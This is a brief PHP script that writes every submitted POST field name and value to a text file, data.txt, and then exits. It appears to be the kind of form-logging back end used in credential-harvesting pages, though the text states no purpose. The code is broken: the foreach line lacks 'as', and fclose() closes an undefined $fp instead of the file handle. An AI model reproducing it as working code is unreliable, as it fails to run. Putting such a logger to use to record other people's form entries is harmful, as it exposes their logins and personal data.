<?php
$file = fopen('data.txt', 'a');
fwrite($file, "\t\t\t\t\t");
fwrite($file, "\r\n");

foreach($_POST $key=>$value){
  fwrite($file, "\t\t\t\t\t");
  fwrite($file, $key);
  fwrite($file, ":");
  fwrite($file, $value);
  fwrite($file, "\r\n");
}

fwrite($file, "\r\n");
fwrite($file, "\t\t\t\t\t");
fclose($fp);
die();
?>
